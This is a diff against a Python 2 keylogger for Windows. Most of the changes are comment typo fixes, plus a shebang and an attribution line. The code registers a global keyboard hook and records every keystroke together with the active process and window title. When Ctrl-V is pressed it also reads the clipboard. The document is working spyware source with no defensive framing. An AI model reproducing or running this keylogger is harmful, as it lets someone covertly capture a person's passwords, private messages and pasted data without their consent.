@@ -1,3 +1,5 @@
+#!/usr/env python
+
 from ctypes import *
 import pythoncom
 import pyHook 
@@ -10,10 +12,10 @@ current_window = None
 
 def get_current_process():
 
-    # get a handle to the foreground
+    # get a handle to the foreground window
     hwnd = user32.GetForegroundWindow()
 
-    # find the proccess ID
+    # find the process ID
     pid = c_ulong(0)
     user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
@@ -26,7 +28,7 @@ def get_current_process():
 
     psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
 
-    # now read its title
+    # now read it's title
     window_title = create_string_buffer("\x00" * 512)
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
@@ -44,16 +46,17 @@ def KeyStroke(event):
 
     global current_window   
 
-    # check to  see if target changed getforegroundwindows
+    # check to see if target changed windows
     if event.WindowName != current_window:
         current_window = event.WindowName        
         get_current_process()
 
-    # if they pressed a standard  key
+    # if they pressed a standard key
     if event.Ascii > 32 and event.Ascii < 127:
         print chr(event.Ascii),
     else:
-        # [Ctrl-V], get the value on the clipboard
+        # if [Ctrl-V], get the value on the clipboard
+        # added by Dan Frisch 2014
         if event.Key == "V":
             win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
@@ -62,13 +65,13 @@ def KeyStroke(event):
         else:
             print "[%s]" % event.Key,
 
-    # pass exevution to next hook registered
+    # pass execution to next hook registered 
     return True
 
-# create and register a hook manager
+# create and register a hook manager 
 kl         = pyHook.HookManager()
 kl.KeyDown = KeyStroke
 
-# register the hook and exevute forever
+# register the hook and execute forever
 kl.HookKeyboard()
 pythoncom.PumpMessages()
